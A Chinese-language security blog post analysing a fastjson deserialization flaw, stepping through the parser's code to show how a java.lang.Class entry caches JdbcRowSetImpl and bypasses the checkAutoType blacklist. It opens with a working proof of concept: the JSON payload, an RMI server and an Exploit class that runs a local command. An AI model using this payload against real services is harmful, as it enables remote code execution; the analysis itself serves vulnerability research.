> 原文链接: https://www.anquanke.com//post/id/183197 


# 最新fastjson反序列化漏洞分析


                                阅读量   
                                **273420**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01ae8d610bacad1dba.png)](https://p1.ssl.qhimg.com/t01ae8d610bacad1dba.png)



## 前言

写的有点多，可能对师傅们来说比较啰嗦，不过这么写完感觉自己也就明白了



## poc

> newPoc.java

```
import com.alibaba.fastjson.JSON;

public class newPoc `{`
    public static void main(String[] argv) `{`
        String payload = "`{`"name":`{`"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"`}`," +
                ""xxxx":`{`"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":" +
                ""rmi://localhost:1099/Exploit","autoCommit":true`}``}``}`";
        JSON.parse(payload);
    `}`
`}`
```

> Exploit.java

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit implements ObjectFactory `{`
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) `{`
        exec("xterm");
        return null;
    `}`

    public static String exec(String cmd) `{`
        try `{`
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
        return "";
    `}`

    public static void main(String[] args) `{`
        exec("123");
    `}`
`}`
```

> rmiServer.java

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class rmiServer `{`
    public static void main(String[] args) throws Exception `{`
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exploit", "Exploit", "http://localhost:1099/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        System.out.println("service bind at 1099");
        registry.bind("Exploit", wrapper);
    `}`
`}`
```

```
`{`
    "name":`{`
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    `}`,
    "xxxx":`{`
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://localhost:1099/Exploit",
        "autoCommit":true
    `}`
`}`
```



## 漏洞触发流程

在JSON.parse处下断点，单步进入到JSON这个类中，开始了fastjson库的解析过程

经过几个parse函数(java中，一个函数由函数名和函数参数唯一确定，也就是java中的函数签名)，虽然同为parse这个函数，但是函数参数不同，故进入到不同的函数中

```
public static Object parse(String text) `{`
    return parse(text, DEFAULT_PARSER_FEATURE);
`}`

public static Object parse(String text, int features) `{`
    return parse(text, ParserConfig.getGlobalInstance(), features);
`}`

public static Object parse(String text, ParserConfig config, int features) `{`
    if (text == null) `{`
        return null;
    `}` else `{`
        DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
        Object value = parser.parse();
        parser.handleResovleTask(value);
        parser.close();
        return value;
    `}`
`}`
```

在最后一个parse中，真正进入到json解析的流程

### <a class="reference-link" name="0x01%20%E6%80%BB%E8%A7%88"></a>0x01 总览

我们先不急着跟下去，因为java的调用链一般来说比较深，所以我们先看一下整个大体的流程是什么样，来自己判断一下这些函数都是用来干什么的，先宏观的看，再跟进去一步步看它在做什么

> DefaultJSONParser parser = new DefaultJSONParser(text, config, features);

初始化一个默认的json解析器

> Object value = parser.parse();

调用这个json解析器的parse函数，来进行json解析

> parser.handleResovleTask(value);

这个函数暂时不知道干什么，先放着

> parser.close();

将解析器关闭

> return value;

返回json解析的结果

可以看出来，我们真正需要关注的，其实就是DefaultJSONParser的生成和DefaultJSONParser对我们输入json数据的处理

### <a class="reference-link" name="0x02%20%E5%88%9D%E5%A7%8B%E5%8C%96json%E8%A7%A3%E6%9E%90%E5%99%A8%EF%BC%88DefaultJSONParser%20parser%20=%20new%20DefaultJSONParser(text,%20config,%20features);%EF%BC%89"></a>0x02 初始化json解析器（DefaultJSONParser parser = new DefaultJSONParser(text, config, features);）
1. 在DefaultJSONParser这个类中有一部分静态代码块，在实例化它的时候，最先调用静态代码块
```
static `{`
        Class&lt;?&gt;[] classes = new Class[]`{`Boolean.TYPE, Byte.TYPE, Short.TYPE, Integer.TYPE, Long.TYPE, Float.TYPE, Double.TYPE, Boolean.class, Byte.class, Short.class, Integer.class, Long.class, Float.class, Double.class, BigInteger.class, BigDecimal.class, String.class`}`;
        Class[] var1 = classes;
        int var2 = classes.length;

        for(int var3 = 0; var3 &lt; var2; ++var3) `{`
            Class&lt;?&gt; clazz = var1[var3];
            primitiveClasses.add(clazz);
        `}`

    `}`
```

这里就是把很多原生类都加入到了primitiveClasses这个集合中，供后面的使用
1. 接下来调用DefaultJSONParser的构造函数
```
public DefaultJSONParser(String input, ParserConfig config, int features) `{`
        this(input, new JSONScanner(input, features), config);
    `}`
```

这里初始化了JSONScaner，对我们的json数据进行一些注册

```
public JSONScanner(String input, int features) `{`
        super(features);
        this.text = input;
        this.len = this.text.length();
        this.bp = -1;
        this.next();
        if (this.ch == 'ufeff') `{`
            this.next();
        `}`

    `}`
```
1. 进入DefaultJSONParser初始化
```
public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) `{`
        this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
        this.contextArrayIndex = 0;
        this.resolveStatus = 0;
        this.extraTypeProviders = null;
        this.extraProcessors = null;
        this.fieldTypeResolver = null;
        this.autoTypeAccept = null;
        this.lexer = lexer;
        this.input = input;
        this.config = config;
        this.symbolTable = config.symbolTable;
        int ch = lexer.getCurrent();
        if (ch == '`{`') `{`
            lexer.next();
            ((JSONLexerBase)lexer).token = 12;
        `}` else if (ch == '[') `{`
            lexer.next();
            ((JSONLexerBase)lexer).token = 14;
        `}` else `{`
            lexer.nextToken();
        `}`

    `}`
```

这里对一些成员变量进行注册，并且我们的json数据开头是’`{`‘，所以token被设置为12

至此，对DefaultJSONParser的初始化就结束了，可以看到在这一个函数中，做的主要还是对整个解析上下文的初始化，将json数据和之后需要用到的类进行注册，以便后面的使用

### <a class="reference-link" name="0x03%20%E5%BC%80%E5%A7%8Bjson%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%EF%BC%88Object%20value%20=%20parser.parse();%EF%BC%89"></a>0x03 开始json解析流程（Object value = parser.parse();）

进入到DefaultJSONParser的parse方法，fastjson的真正json解析就开始了

```
public Object parse() `{`
    return this.parse((Object)null);
`}`

public Object parse(Object fieldName)`{`
    JSONLexer lexer = this.lexer;
    switch(lexer.token()) `{`
        ......
        case 12:
            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
            return this.parseObject((Map)object, fieldName);
        ......
`}`
```

代码比较长，在上面DefaultJSONParser的初始化中，将我们的token值设置为了12，所以进入到case 12这个条件中
1. 先构建了一个JSONObject对象
1. 进入到parseObject中
1. 因为现在的token为12，所以一路if条件跳过，最后到else块中
```
ParseContext context = this.context;
try `{`
    Map map = object instanceof JSONObject ? ((JSONObject)object).getInnerMap() : object;
    boolean setContextFlag = false;

    while(true) `{`
        lexer.skipWhitespace();
        char ch = lexer.getCurrent();
        if (lexer.isEnabled(Feature.AllowArbitraryCommas)) `{`
            while(ch == ',') `{`
                lexer.next();
                lexer.skipWhitespace();
                ch = lexer.getCurrent();
            `}`
        `}`
        ......
    `}`
`}`
```

这是一个非常庞大的while循环，在这里面进行对json字符串的语法分析，以及各种判断

### <a class="reference-link" name="0x04%20%E5%B7%A8%E5%A4%A7%E7%9A%84while"></a>0x04 巨大的while

json的解析过程是一个字符一个字符判断的，和js的判断机制有些类似
1. 在while中先将键名解析出来
1. 下一个值的开头是’`{`‘
1. 因为开头是’`{`‘，意味着这是嵌套的一个json
1. 之后到537行，再次调用parseObject，将键名传入参数，来获取对应键的值
**可以将parseObject想像成一个魔法盒子，它会将你传入的比如`{`‘xxx’:’xxx’`}`这样的json解析，将它根据键值存到一个map里面，那么如果你传入的是`{`‘xxx’ : `{`‘xxx’:’xxx’`}``}`这样形式的话，因为值也是一个键值对的形式，所以又会再次调用parseObject，那么最后的结果也就变成了一个map中嵌套一个map的结构**
1. 接下来，嵌套的这个json中就有意思了
java中的json不像php中的json那么单纯，java中的json最重要的是它是java实现反序列化和序列化的很重要的手段，所以在fastjson中，定义了一些键，如果这些键出现的时候，那么这个键对应的值就不会被单纯的认为是字符串

我们抽出来这个值：

```
"name":`{`
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    `}`
```

这个键名是[@type](https://github.com/type)，当我们继续调试到292行的时候

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a53e91ceafd7d445.png)

这里判断了两个条件：

> &lt;1&gt; key == JSON.DEFAULT_TYPE_KEY 判断了是否为预设的特殊键名
&lt;2&gt; !lexer.isEnabled(Feature.DisableSpecialKeyDetect) 是否关闭了特殊键名的探测（默认开启）

[![](https://p4.ssl.qhimg.com/t014179f823a656053f.png)](https://p4.ssl.qhimg.com/t014179f823a656053f.png)

正是我们传入的[@type](https://github.com/type)，所以这个json就不被认为是一个普通的字符串，而会是一个对象，这里也就进入了反序列化的地方

[![](https://p2.ssl.qhimg.com/t0175ac19a7afc32d35.png)](https://p2.ssl.qhimg.com/t0175ac19a7afc32d35.png)

这里获取到我们的[@type](https://github.com/type)的值为’java.lang.Class’

[![](https://p5.ssl.qhimg.com/t01c93c0d401de33566.png)](https://p5.ssl.qhimg.com/t01c93c0d401de33566.png)

这里就是在第一次fastjson反序列化出现的之后补丁所添加的，它限制了反序列化的类的白名单和黑名单，这次包括之前的fastjson反序列化漏洞都是因为checkAutoType的问题导致的

### <a class="reference-link" name="0x05%20checkAutoType"></a>0x05 checkAutoType

在这里，检测了我们反序列化的类是否在黑名单里面，也就是下面的这一段：

[![](https://p3.ssl.qhimg.com/t01af7724c36fe81ee0.png)](https://p3.ssl.qhimg.com/t01af7724c36fe81ee0.png)

这里，阿里玩了一个小技巧，为了防止攻击者拿到禁止类的黑白名单，阿里并没有直接拿类名称来比较，而是拿类的一段字符串的hash来比较，这样就不那么容易知道阿里的黑白名单具体是什么（当然已经有大佬搞出来了）

我们可以看到如果我们传入的类符合this.denyHashCodes定义的hash的话，就不会反序列化这个类了，当然com.sun.rowset.JdbcRowSetImpl这个类必定是被禁止了的

之后再进行白名单的校验，确保[@type](https://github.com/type)的这个类是完全没问题的，所以这个地方，我们的恶意类不能进入到这一段代码中，进去就是gg

继续回到我们之前的流程，因为在IdentityHashMap中有java.lang.Class，也就是这个类被认为是安全的，所以在clazz = this.deserializers.findClass(typeName);这个地方就直接获得了java.lang.Class对象

[![](https://p3.ssl.qhimg.com/t0161dfef9ec46fd319.png)](https://p3.ssl.qhimg.com/t0161dfef9ec46fd319.png)

而之后的

```
if (clazz != null) `{`
                    if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) `{`
                        throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName());
                    `}` else `{`
                        return clazz;
                    `}`
                `}`
```

就直接返回了java.lang.Class对象

### <a class="reference-link" name="0x06%20%E5%9B%9E%E5%88%B0DefaultJSONParser"></a>0x06 回到DefaultJSONParser

在checkAutoType检测完成以后，我们的clazz变量就成了java.lang.Class对象

调用`ObjectDeserializer deserializer = this.config.getDeserializer(clazz)`

[![](https://p4.ssl.qhimg.com/t017d12028ec4c0cf1c.png)](https://p4.ssl.qhimg.com/t017d12028ec4c0cf1c.png)

`ObjectDeserializer derializer = (ObjectDeserializer)this.deserializers.get(type);`

在这个地方我们获得了对应的deserilizer：MiscCodec对象

之后调用了MiscCodec对象的deserilize方法

进入到这个方法中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bf1a2a5b0ae8fc8e.png)

之后调用parser.parse()

走到了这里

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ba1ae35c8ce9de84.png)

这里通过String stringLiteral = lexer.stringVal();获取到了val这个键名对应的值：com.sun.rowset.JdbcRowSetImpl，最后将这个字符串返回

后面对我们的java.lang.Class进行一系列的判断，进入到

[![](https://p0.ssl.qhimg.com/t01d90d40317d70c323.png)](https://p0.ssl.qhimg.com/t01d90d40317d70c323.png)

继续跟进，一路进入到loadClass这个函数

简单来说，这个函数判断预先定义的类的map里面有没有传进来的这个className，如果没有的话，就把它加进去

[![](https://p2.ssl.qhimg.com/t015d53e19ed3d4d695.png)](https://p2.ssl.qhimg.com/t015d53e19ed3d4d695.png)

而这个map正是checkAutoType里面的map，这个地方就是漏洞的触发点，通过将com.sun.rowset.JdbcRowSetImpl这个类加载到map中，从而绕过了checkAutoType的验证，进而造成了反序列化



## 0x07 新一轮的json解析

前面说过，那个大while里面是解析json用的，在第一个键值对解析完了以后，继续开始解析第二个键值对，也就是：

```
"xxxx":`{`
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://localhost:1099/Exploit",
        "autoCommit":true
    `}`
```

和前面的流程基本一摸一样，检测到[@type](https://github.com/type)字段，获取到[@type](https://github.com/type)对应的值，也就是com.sun.rowset.JdbcRowSetImpl，进入到checkAutoType的检验，我们直接跟到checkAutoType的检验中

前面都没什么好说的，最重要的是这一步：

[![](https://p1.ssl.qhimg.com/t01681bc02bbb402864.png)](https://p1.ssl.qhimg.com/t01681bc02bbb402864.png)

我们跟进，来到了这个函数

```
public static Class&lt;?&gt; getClassFromMapping(String className) `{`
        return (Class)mappings.get(className);
    `}`
```

而maps里面的值为：

```
"java.text.SimpleDateFormat" -&gt; `{`Class@691`}` "class java.text.SimpleDateFormat"
"java.util.concurrent.ConcurrentHashMap" -&gt; `{`Class@18`}` "class java.util.concurrent.ConcurrentHashMap"
"java.lang.InternalError" -&gt; `{`Class@348`}` "class java.lang.InternalError"
"java.lang.StackOverflowError" -&gt; `{`Class@7`}` "class java.lang.StackOverflowError"
"java.sql.Date" -&gt; `{`Class@696`}` "class java.sql.Date"
"java.util.concurrent.atomic.AtomicInteger" -&gt; `{`Class@40`}` "class java.util.concurrent.atomic.AtomicInteger"
"java.lang.Exception" -&gt; `{`Class@227`}` "class java.lang.Exception"
"java.lang.IllegalStateException" -&gt; `{`Class@700`}` "class java.lang.IllegalStateException"
"java.util.Calendar" -&gt; `{`Class@702`}` "class java.util.Calendar"
"java.lang.InterruptedException" -&gt; `{`Class@704`}` "class java.lang.InterruptedException"
"java.util.BitSet" -&gt; `{`Class@192`}` "class java.util.BitSet"
"java.util.Hashtable" -&gt; `{`Class@236`}` "class java.util.Hashtable"
"[C" -&gt; `{`Class@341`}` "class [C"
"java.util.TreeMap" -&gt; `{`Class@709`}` "class java.util.TreeMap"
"java.util.LinkedHashMap" -&gt; `{`Class@111`}` "class java.util.LinkedHashMap"
"java.sql.Timestamp" -&gt; `{`Class@712`}` "class java.sql.Timestamp"
"java.lang.IllegalArgumentException" -&gt; `{`Class@75`}` "class java.lang.IllegalArgumentException"
"java.util.concurrent.TimeUnit" -&gt; `{`Class@715`}` "class java.util.concurrent.TimeUnit"
"java.lang.InstantiationError" -&gt; `{`Class@717`}` "class java.lang.InstantiationError"
"java.lang.IndexOutOfBoundsException" -&gt; `{`Class@719`}` "class java.lang.IndexOutOfBoundsException"
"java.lang.VerifyError" -&gt; `{`Class@721`}` "class java.lang.VerifyError"
"long" -&gt; `{`Class@723`}` "long"
"java.lang.IllegalThreadStateException" -&gt; `{`Class@725`}` "class java.lang.IllegalThreadStateException"
"java.util.WeakHashMap" -&gt; `{`Class@279`}` "class java.util.WeakHashMap"
"java.lang.InstantiationException" -&gt; `{`Class@728`}` "class java.lang.InstantiationException"
"java.lang.NoSuchMethodError" -&gt; `{`Class@180`}` "class java.lang.NoSuchMethodError"
"[short" -&gt; `{`Class@343`}` "class [S"
"java.lang.StackTraceElement" -&gt; `{`Class@732`}` "class java.lang.StackTraceElement"
"[byte" -&gt; `{`Class@340`}` "class [B"
"short" -&gt; `{`Class@735`}` "short"
"java.lang.AutoCloseable" -&gt; `{`Class@263`}` "interface java.lang.AutoCloseable"
"[D" -&gt; `{`Class@346`}` "class [D"
"char" -&gt; `{`Class@739`}` "char"
"java.lang.LinkageError" -&gt; `{`Class@299`}` "class java.lang.LinkageError"
"java.lang.IllegalAccessError" -&gt; `{`Class@742`}` "class java.lang.IllegalAccessError"
"[double" -&gt; `{`Class@346`}` "class [D"
"java.sql.Time" -&gt; `{`Class@745`}` "class java.sql.Time"
"java.lang.NegativeArraySizeException" -&gt; `{`Class@747`}` "class java.lang.NegativeArraySizeException"
"java.util.Locale" -&gt; `{`Class@294`}` "class java.util.Locale"
"java.lang.NullPointerException" -&gt; `{`Class@186`}` "class java.lang.NullPointerException"
"[float" -&gt; `{`Class@345`}` "class [F"
"[int" -&gt; `{`Class@342`}` "class [I"
"java.util.HashMap" -&gt; `{`Class@144`}` "class java.util.HashMap"
"java.lang.OutOfMemoryError" -&gt; `{`Class@260`}` "class java.lang.OutOfMemoryError"
"java.util.IdentityHashMap" -&gt; `{`Class@755`}` "class java.util.IdentityHashMap"
"[long" -&gt; `{`Class@344`}` "class [J"
"java.lang.NoClassDefFoundError" -&gt; `{`Class@758`}` "class java.lang.NoClassDefFoundError"
"double" -&gt; `{`Class@760`}` "double"
"java.lang.StringIndexOutOfBoundsException" -&gt; `{`Class@762`}` "class java.lang.StringIndexOutOfBoundsException"
"[Z" -&gt; `{`Class@339`}` "class [Z"
"java.lang.IllegalMonitorStateException" -&gt; `{`Class@188`}` "class java.lang.IllegalMonitorStateException"
"[boolean" -&gt; `{`Class@339`}` "class [Z"
"java.util.Collections$EmptyMap" -&gt; `{`Class@277`}` "class java.util.Collections$EmptyMap"
"java.util.concurrent.atomic.AtomicLong" -&gt; `{`Class@316`}` "class java.util.concurrent.atomic.AtomicLong"
"java.util.HashSet" -&gt; `{`Class@177`}` "class java.util.HashSet"
"java.util.concurrent.ConcurrentSkipListMap" -&gt; `{`Class@770`}` "class java.util.concurrent.ConcurrentSkipListMap"
"[F" -&gt; `{`Class@345`}` "class [F"
"java.lang.NumberFormatException" -&gt; `{`Class@773`}` "class java.lang.NumberFormatException"
"[char" -&gt; `{`Class@341`}` "class [C"
"java.util.concurrent.ConcurrentSkipListSet" -&gt; `{`Class@776`}` "class java.util.concurrent.ConcurrentSkipListSet"
"int" -&gt; `{`Class@778`}` "int"
"java.lang.Cloneable" -&gt; `{`Class@254`}` "interface java.lang.Cloneable"
"com.sun.rowset.JdbcRowSetImpl" -&gt; `{`Class@781`}` "class com.sun.rowset.JdbcRowSetImpl"
"java.awt.Point" -&gt; `{`Class@783`}` "class java.awt.Point"
"[J" -&gt; `{`Class@344`}` "class [J"
"java.awt.Font" -&gt; `{`Class@786`}` "class java.awt.Font"
"java.lang.NoSuchFieldException" -&gt; `{`Class@788`}` "class java.lang.NoSuchFieldException"
"java.util.TreeSet" -&gt; `{`Class@790`}` "class java.util.TreeSet"
"java.lang.NoSuchMethodException" -&gt; `{`Class@792`}` "class java.lang.NoSuchMethodException"
"[I" -&gt; `{`Class@342`}` "class [I"
"java.awt.Rectangle" -&gt; `{`Class@795`}` "class java.awt.Rectangle"
"java.util.UUID" -&gt; `{`Class@797`}` "class java.util.UUID"
"java.lang.SecurityException" -&gt; `{`Class@799`}` "class java.lang.SecurityException"
"java.lang.Object" -&gt; `{`Class@256`}` "class java.lang.Object"
"java.util.Date" -&gt; `{`Class@802`}` "class java.util.Date"
"java.lang.RuntimeException" -&gt; `{`Class@49`}` "class java.lang.RuntimeException"
"java.awt.Color" -&gt; `{`Class@805`}` "class java.awt.Color"
"com.alibaba.fastjson.JSONObject" -&gt; `{`Class@555`}` "class com.alibaba.fastjson.JSONObject"
"java.lang.NoSuchFieldError" -&gt; `{`Class@808`}` "class java.lang.NoSuchFieldError"
"java.lang.IllegalAccessException" -&gt; `{`Class@810`}` "class java.lang.IllegalAccessException"
"[B" -&gt; `{`Class@340`}` "class [B"
"java.util.LinkedHashSet" -&gt; `{`Class@813`}` "class java.util.LinkedHashSet"
"byte" -&gt; `{`Class@815`}` "byte"
"java.lang.TypeNotPresentException" -&gt; `{`Class@817`}` "class java.lang.TypeNotPresentException"
"[S" -&gt; `{`Class@343`}` "class [S"
"boolean" -&gt; `{`Class@820`}` "boolean"
"float" -&gt; `{`Class@822`}` "float"
```

而这个map，在第一部分的json解析的时候，我们成功加入了com.sun.rowset.JdbcRowSetImpl（见63行），所以这里直接可以返回JdbcRowSetImpl这个类

```
if (clazz != null) `{`
                    if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) `{`
                        throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName());
                    `}` else `{`
                        return clazz;
                    `}`
                `}`
```

因为在上面获取的map中就返回了clazz的值，所以这里就直接返回了com.sun.rowset.JdbcRowSetImpl类，也就没有了下面的黑白名单检测，也就成功绕过了checkAutoType

### <a class="reference-link" name="0x08%20JdbcRowSetImpl%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>0x08 JdbcRowSetImpl反序列化

[![](https://p3.ssl.qhimg.com/t01ba81378231034a56.png)](https://p3.ssl.qhimg.com/t01ba81378231034a56.png)

最后在这个地方获取了deserializer，并且通过这个deserializer反序列化了JdbcRowSetImpl类，最后成功调用lookup进行JNDI注入

因为这个地方牵扯到java asm直接生成字节码，实在是有点看不懂，就只能跳过了，之后再学习吧，tcl

最后给一张经过asm之后的调用链吧

```
connect:643, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:759, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:1283, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:152, JSON (com.alibaba.fastjson)
parse:162, JSON (com.alibaba.fastjson)
parse:131, JSON (com.alibaba.fastjson)
main:10, newPoc (com.xiang.fastjson.poc)
```
